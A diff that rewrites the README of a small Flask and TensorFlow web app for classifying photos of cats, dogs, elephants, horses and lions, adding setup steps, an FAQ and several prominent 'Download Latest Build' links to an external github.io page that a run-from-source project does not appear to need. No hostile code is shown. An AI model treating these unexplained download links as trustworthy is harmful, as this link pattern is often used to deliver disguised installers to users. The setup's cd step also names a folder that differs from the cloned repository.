@@ -1,15 +1,165 @@
-# Animal Image Classifier
+# Animal Classifier - AI Image Classification Web Application 2026
 
-Project documentation and reference notes for this repository.
+> **Animal Classifier is a Flask-powered web application that applies TensorFlow and Keras deep learning to uploaded images, returning predicted animal classes, confidence values, and the three most likely results.**
+
+[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
+[![Version](https://img.shields.io/badge/Version-Unspecified-green?style=flat-square)](https://github.com)
+[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
+[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
+[![Stars](https://img.shields.io/github/stars/samgreendd1496/animal-image-classifier?style=flat-square)](https://github.com/samgreendd1496/animal-image-classifier)
+
+---
+
+<p align="center">
+  <a href="https://samgreendd1496.github.io/animal-image-classifier/">
+    <img src="https://img.shields.io/badge/Download-Animal%20Classifier%20Latest-brightgreen?style=for-the-badge" alt="Download Animal Classifier">
+  </a>
+</p>
+
+> **[Download Animal Classifier](https://samgreendd1496.github.io/animal-image-classifier/)**
+
+---
+
+[Download Latest Build](https://samgreendd1496.github.io/animal-image-classifier/)
+
+---
 
 ## Overview
 
-This repository contains setup notes, release references, and configuration details.
+Animal Classifier offers a simple browser interface for sending animal photographs to a trained deep learning model. Its Flask backend coordinates image uploads with TensorFlow and Keras inference, then reports the category the model considers most likely.
 
-## Usage
+The current model covers cats, dogs, elephants, horses, and lions. Results include confidence information as well as the three highest-scoring predictions, so users can see both the leading label and the model's other likely interpretations.
 
-Review the project files and documentation for setup information.
+---
+
+## What It Does
+
+- Accept animal image uploads from a web browser
+- Run classification through a TensorFlow/Keras model
+- Identify cats, dogs, elephants, horses, and lions
+- Report confidence scores alongside predictions
+- Present the model's three leading results
+- Expose inference through Flask
+- Make the deep learning pipeline available through a browser
+- Include alternative labels for a broader view of each prediction
+
+---
+
+## Getting Started
+
+First, download the source and move into the project directory:
+
+```bash
+git clone https://github.com/samgreendd1496/animal-image-classifier.git
+cd animal-classifier
+```
+
+Set up an isolated Python environment and install the packages required by the project:
+
+```bash
+python -m venv .venv
+source .venv/bin/activate
+pip install -r requirements.txt
+```
+
+PowerShell users can enable the virtual environment with:
+
+```powershell
+.venv\Scripts\Activate.ps1
+```
+
+Run the Flask server through the project's application entry point:
+
+```bash
+python app.py
+```
+
+When Flask displays the local server address, open it in a browser and upload an animal image to receive its predictions.
+
+---
+
+## Using the Classifier
+
+1. Start the Flask server.
+2. Navigate to the local address provided by the application.
+3. Choose an image that contains an animal.
+4. Submit the file for inference.
+5. Inspect the primary prediction, its confidence score, and the three-result ranking.
+6. Upload additional images when you want to compare outputs.
+
+The model currently recognizes these classes:
+
+- Cat
+- Dog
+- Elephant
+- Horse
+- Lion
+
+---
+
+## Runtime Configuration
+
+Configuration is supplied through the repository files and the environment in which the application runs. Make sure the trained TensorFlow/Keras model is present, along with any other settings, in the locations expected by the Flask application before launching the server.
+
+For local work, environment-specific values should generally remain outside version control when appropriate. Where the repository includes a sample environment file or configuration module, use it to determine the values required for a local setup.
+
+---
+
+## Prerequisites
+
+- A current web browser
+- A Python runtime compatible with the Flask application
+- Flask
+- TensorFlow
+- Keras
+- The packages declared in `requirements.txt`
+- The trained classification model
+- Enough local storage for the project and model files
+
+Once the Flask server is active, the application operates as a browser-accessible web service.
+
+---
+
+## Frequently Asked Questions
+
+### What animal categories are supported?
+
+The model currently produces predictions for cats, dogs, elephants, horses, and lions.
+
+### Will I see multiple predictions?
+
+Yes. In addition to confidence information, the interface displays the three highest-ranked outputs generated by the model.
+
+### What is the process for updating the app?
+
+Pull or download the newest project files, update the installed dependencies, and restart Flask. Changes to the model should follow the repository's model-file and application-configuration conventions.
+
+### Where should I change application settings?
+
+Look in the Flask application files and any environment or configuration files included by the repository. Review the project structure before modifying runtime settings.
+
+### Why might an upload not work?
+
+Check that the Flask server is running and that its local address is reachable from the browser. Also verify that the selected file is supported and that the required dependencies and model files are available.
+
+### Can the classifier guarantee the correct label?
+
+No. The output is a model-generated prediction rather than a guarantee. Use the confidence score and the alternative results in the top-three list when interpreting it.
+
+---
+
+## Possible Future Work
+
+Future development may focus on:
+
+- Supporting additional animal classes
+- Enhancing the classification model
+- Improving the upload and results experience
+- Making runtime configuration easier to understand
+- Extending evaluation and testing coverage
+
+---
 
 ## License
 
-See [LICENSE](LICENSE).
+GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
